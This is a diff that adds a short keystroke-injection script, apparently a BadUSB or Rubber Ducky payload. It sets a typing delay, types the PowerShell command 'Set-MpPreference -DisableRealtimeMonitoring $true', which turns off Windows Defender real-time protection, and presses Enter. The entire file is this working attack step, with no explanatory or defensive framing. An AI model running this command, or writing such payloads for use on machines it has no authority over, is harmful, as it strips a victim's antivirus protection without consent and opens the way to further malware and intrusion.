@@ -1,0 +1,4 @@
+DEFAULTCHARDELAY 15
+
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
